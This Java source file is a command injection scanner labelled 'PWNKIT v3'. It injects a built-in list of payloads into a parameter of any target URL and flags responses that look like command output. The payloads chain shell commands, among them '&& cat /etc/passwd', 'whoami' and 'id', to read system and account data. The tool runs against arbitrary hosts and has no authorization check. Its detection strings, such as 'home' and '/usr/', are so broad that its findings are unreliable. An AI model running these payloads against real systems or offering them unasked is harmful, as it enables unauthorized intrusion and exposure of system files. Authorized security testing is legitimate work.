/**
 * Command Injection Scanner
 * A penetration testing utility to detect OS command injection vulnerabilities
 * 
 * Credits: Caleb D
 */

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.regex.*;

public class CommandInjectionScanner {

    // ANSI color codes for Chevy Orange
    private static final String CHEVY_ORANGE = "\u001B[38;5;202m";
    private static final String RESET = "\u001B[0m";
    private static final String GREEN = "\u001B[32m";
    private static final String RED = "\u001B[31m";
    private static final String YELLOW = "\u001B[33m";

    // Common OS command injection payloads
    private static final String[] PAYLOADS = {
        "; whoami",
        "| whoami",
        "&& whoami",
        "; id",
        "| id",
        "&& id",
        "; pwd",
        "| pwd",
        "&& pwd",
        "; uname -a",
        "| uname -a",
        "&& uname -a",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "; echo $PATH",
        "| echo $PATH",
        "&& echo $PATH"
    };

    // Patterns that indicate successful command execution
    private static final String[] SUCCESS_PATTERNS = {
        "root:",
        "bin:",
        "daemon:",
        "nobody:",
        "Users\\\\",
        "Desktop",
        "Documents",
        "home",
        "/usr/",
        "/bin/",
        "/sbin/"
    };

    public static void main(String[] args) {
        printBanner();
        
        if (args.length < 2) {
            printUsage();
            return;
        }

        String targetUrl = args[0];
        String parameterName = args[1];
        String customPayload = args.length > 2 ? args[2] : null;

        try {
            scanForCommandInjection(targetUrl, parameterName, customPayload);
        } catch (Exception e) {
            System.out.println(CHEVY_ORANGE + "[!] Error: " + e.getMessage() + RESET);
        }
    }

    private static void printBanner() {
        System.out.println(CHEVY_ORANGE);
        System.out.println("╔════════════════════════════════════════════════════════════╗");
        System.out.println("║          Command Injection Scanner - PWNKIT v3            ║");
        System.out.println("║              Penetration Testing Utility                  ║");
        System.out.println("╠════════════════════════════════════════════════════════════╣");
        System.out.println("║  Credits: Caleb D                                         ║");
        System.out.println("╚════════════════════════════════════════════════════════════╝");
        System.out.println(RESET);
    }

    private static void printUsage() {
        System.out.println(CHEVY_ORANGE);
        System.out.println("Usage: java CommandInjectionScanner <url> <parameter> [payload]");
        System.out.println();
        System.out.println("Example:");
        System.out.println("  java CommandInjectionScanner \"http://target.com/page.php\" \"cmd\"");
        System.out.println("  java CommandInjectionScanner \"http://target.com/page.php\" \"file\" \";ls\"");
        System.out.println();
        System.out.println("Parameters:");
        System.out.println("  url      - Target URL with parameter placeholder");
        System.out.println("  parameter - Parameter name to inject");
        System.out.println("  payload  - Custom payload (optional, uses default if not specified)");
        System.out.println(RESET);
    }

    private static void scanForCommandInjection(String targetUrl, String parameterName, String customPayload) 
            throws Exception {
        
        System.out.println(CHEVY_ORANGE + "[*] Starting Command Injection Scan..." + RESET);
        System.out.println(CHEVY_ORANGE + "[*] Target: " + targetUrl + RESET);
        System.out.println(CHEVY_ORANGE + "[*] Parameter: " + parameterName + RESET);
        System.out.println();

        String[] payloadsToUse = customPayload != null 
            ? new String[]{customPayload}
            : PAYLOADS;

        int vulnerabilitiesFound = 0;

        for (String payload : payloadsToUse) {
            System.out.println(YELLOW + "[*] Testing payload: " + payload + RESET);
            
            String testUrl = buildTestUrl(targetUrl, parameterName, payload);
            String response = sendRequest(testUrl);

            if (response != null && checkForCommandOutput(response)) {
                System.out.println(GREEN + "[+] VULNERABLE: " + payload + RESET);
                System.out.println(GREEN + "[+] Response contains command execution evidence!" + RESET);
                vulnerabilitiesFound++;
            } else {
                System.out.println(RED + "[-] Not vulnerable with this payload" + RESET);
            }
            
            // Small delay between requests
            Thread.sleep(100);
        }

        System.out.println();
        if (vulnerabilitiesFound > 0) {
            System.out.println(GREEN + "[!] WARNING: " + vulnerabilitiesFound + " potential vulnerabilities found!" + RESET);
            System.out.println(GREEN + "[!] Manual verification recommended." + RESET);
        } else {
            System.out.println(GREEN + "[*] Scan complete. No obvious command injection detected." + RESET);
            System.out.println(YELLOW + "[!] This does not guarantee the target is secure." + RESET);
        }
        
        System.out.println();
        System.out.println(CHEVY_ORANGE + "Credits: Caleb D" + RESET);
    }

    private static String buildTestUrl(String baseUrl, String parameterName, String payload) 
            throws UnsupportedEncodingException {
        
        String encodedPayload = URLEncoder.encode(payload, "UTF-8");
        
        if (baseUrl.contains("?")) {
            return baseUrl + "&" + parameterName + "=" + encodedPayload;
        } else {
            return baseUrl + "?" + parameterName + "=" + encodedPayload;
        }
    }

    private static String sendRequest(String urlString) {
        try {
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setInstanceFollowRedirects(false);

            int responseCode = conn.getResponseCode();
            
            if (responseCode == 200 || responseCode == 302 || responseCode == 301) {
                BufferedReader reader = new BufferedReader(
                    new InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                
                while ((line = reader.readLine()) != null) {
                    response.append(line).append("\n");
                }
                reader.close();
                
                return response.toString();
            }
            
            conn.disconnect();
        } catch (Exception e) {
            // Request failed or redirected
        }
        
        return null;
    }

    private static boolean checkForCommandOutput(String response) {
        for (String pattern : SUCCESS_PATTERNS) {
            if (response.contains(pattern)) {
                return true;
            }
        }
        
        // Check for user context indicators
        if (response.contains("uid=") || response.contains("gid=")) {
            return true;
        }
        
        // Check for common command output patterns
        if (Pattern.compile("(drwxrwxrwx|d---------|[0-9]{4}-[0-9]{2}-[0-9]{2}\\s+[0-9]{2}:[0-9]{2})", 
                           Pattern.CASE_INSENSITIVE).matcher(response).find()) {
            return true;
        }
        
        return false;
    }
}
